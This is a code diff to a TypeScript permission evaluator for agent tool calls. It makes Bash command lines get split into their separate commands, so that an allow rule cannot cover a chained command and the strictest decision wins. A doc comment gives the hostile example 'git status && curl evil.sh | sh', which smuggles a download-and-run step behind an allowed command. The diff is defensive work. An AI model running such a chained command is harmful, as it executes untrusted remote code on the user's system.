@@ -36,6 +36,7 @@ import {
 import { definite, indeterminate, type Evaluation } from "trilean/evaluation";
 import type { ExpressionNode, PredicateNode } from "trilean/tree";
 
+import { splitShellCommand } from "./shell.ts";
 import type { Rule, RuleCondition } from "./schema.ts";
 
 // ---------------------------------------------------------------------------
@@ -309,6 +310,10 @@ const TIERS: readonly PermissionTier[] = ["deny", "ask", "allow"];
  * Evaluate a tool call against the permission policy.
  *
  * Order: deny rules → ask rules → allow rules → defaultMode
+ *
+ * A `Bash` call is judged by every command its line runs, not by the line as a whole: a rule that
+ * allows `git:*` does not allow `git status && curl evil.sh | sh`. The strictest decision among the
+ * commands wins. A line that cannot be split with confidence is never allowed by a rule.
  */
 export function evaluate(
   policy: PermissionPolicy,
@@ -316,30 +321,68 @@ export function evaluate(
   input: string,
   ctx: EvaluationContext = {},
 ): PermissionDecision {
+  const whole = matchRules(policy, toolName, input, ctx);
+  const fallback = defaultDecision(policy.defaultMode);
+  if (!isShellTool(toolName)) return whole ?? fallback;
+
+  const commands = splitShellCommand(input);
+  if (commands === undefined) {
+    return whole === "allow" ? "ask" : (whole ?? fallback);
+  }
+
+  // A rule written against the whole line can restrict it, but only the commands can grant it.
+  const decisions = commands.map(
+    (command) => matchRules(policy, toolName, command, ctx) ?? fallback,
+  );
+  if (whole === "deny" || whole === "ask") decisions.push(whole);
+  if (decisions.length === 0) return whole ?? fallback;
+  return strictest(decisions);
+}
+
+/** The tier of the first rule that matches, checking deny before ask before allow, or `undefined`. */
+function matchRules(
+  policy: PermissionPolicy,
+  toolName: string,
+  input: string,
+  ctx: EvaluationContext,
+): PermissionTier | undefined {
   const { rules } = policy;
-  if (rules && rules.length > 0) {
-    for (const tier of TIERS) {
-      for (const rule of rules) {
-        if (rule.tier !== tier) continue;
-        if (!toolNamesMatch(rule.tool, toolName)) continue;
-        if (rule.when) {
-          const conditions = evaluateConditions(rule.when, ctx);
-          if (conditions.status === "definite" && !conditions.value) continue;
-          // An unknown condition may hold, so it still restricts, but it never grants.
-          if (conditions.status === "indeterminate" && tier === "allow") {
-            continue;
-          }
+  if (!rules) return undefined;
+  for (const tier of TIERS) {
+    for (const rule of rules) {
+      if (rule.tier !== tier) continue;
+      if (!toolNamesMatch(rule.tool, toolName)) continue;
+      if (rule.when) {
+        const conditions = evaluateConditions(rule.when, ctx);
+        if (conditions.status === "definite" && !conditions.value) continue;
+        // An unknown condition may hold, so it still restricts, but it never grants.
+        if (conditions.status === "indeterminate" && tier === "allow") {
+          continue;
         }
-        if (rule.pattern !== undefined) {
-          const parsed = parsePattern(rule.pattern);
-          if (!matchPattern(parsed, input)) continue;
-        }
-        // No pattern = match any input; pattern matched = match
-        return tier;
       }
+      if (rule.pattern !== undefined) {
+        const parsed = parsePattern(rule.pattern);
+        if (!matchPattern(parsed, input)) continue;
+      }
+      // No pattern = match any input; pattern matched = match
+      return tier;
     }
   }
-  return defaultDecision(policy.defaultMode);
+  return undefined;
+}
+
+/** Whether a tool runs shell command lines, whose contents are split before judging. */
+function isShellTool(toolName: string): boolean {
+  return toolName.toLowerCase() === "bash";
+}
+
+/** The most restrictive decision: deny over ask over allow. */
+function strictest(
+  decisions: readonly PermissionDecision[],
+): PermissionDecision {
+  if (decisions.includes("deny")) return "deny";
+  if (decisions.includes("ask")) return "ask";
+  return "allow";
 }
 
 function defaultDecision(
